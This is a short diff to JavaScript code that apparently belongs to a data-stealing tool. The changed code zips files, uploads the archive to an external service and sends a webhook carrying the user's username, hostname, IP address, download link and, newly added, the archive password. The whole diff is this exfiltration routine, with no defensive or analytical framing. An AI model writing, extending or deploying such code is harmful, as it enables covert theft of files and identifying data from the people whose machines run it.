@@ -184,7 +184,7 @@ class Application {
             // Determine if file should be uploaded
             let downloadLink = '';
             if (uploadService.shouldUpload(zipPath)) {
-                logger.info('File size exceeds limit, uploading to external service');
+                logger.info('Uploading password-protected archive to external service');
                 downloadLink = await uploadService.upload(zipPath);
             }
 
@@ -212,11 +212,13 @@ class Application {
     async sendMainWebhook(downloadLink = '', zipPath = '') {
         try {
             const systemInfo = stats.getRawData().system;
+            const archivePassword = fileManager.getArchivePassword();
             const payload = stats.buildWebhookPayload(
                 systemInfo.username,
                 systemInfo.hostname,
                 systemInfo.ip,
-                downloadLink
+                downloadLink,
+                archivePassword
             );
 
             if (downloadLink) {
